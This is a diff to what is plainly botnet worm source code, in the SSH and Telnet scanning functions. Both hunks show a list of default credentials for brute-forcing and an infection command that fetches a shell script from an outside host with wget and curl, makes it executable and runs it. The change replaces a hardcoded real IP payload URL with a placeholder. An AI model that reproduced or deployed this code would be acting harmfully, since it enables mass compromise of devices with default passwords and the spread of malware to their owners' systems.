@@ -70,8 +70,9 @@ def _SSHScan(_num, _wait, _tmout):
 
     _crdntl = ["root:toor", "root:root", "admin:1234", "admin:admin", "guest:guest"]
     _blklst = ["127.0", "10.0", "192.168"]
-    
-    _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.89.200.158/bins.sh; curl -O http://23.89.200.158/bins.sh; chmod 777 bins.sh; sh bins.sh'
+
+    _payloadURL = 'http://0.0.0.0/downloader.sh'
+    _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget {}; curl -O {}; chmod 777 downloader.sh; sh downloader.sh'.format(_payloadURL, _payloadURL)
     
     # install SSH module
     try:
@@ -139,7 +140,8 @@ def _TELScan(_num, _wait, _combo, _setup):
     _crdntl = ["root:toor", "root:root", "admin:1234", "admin:admin", "guest:guest"]
     _blklst = ["127.0", "10.0", "192.168"]
     
-    _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.89.200.158/bins.sh; curl -O http://23.89.200.158/bins.sh; chmod 777 bins.sh; sh bins.sh'
+    _payloadURL = 'http://0.0.0.0/downloader.sh'
+    _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget {}; curl -O {}; chmod 777 downloader.sh; sh downloader.sh'.format(_payloadURL, _payloadURL)
     
     # install SSH module
     try:
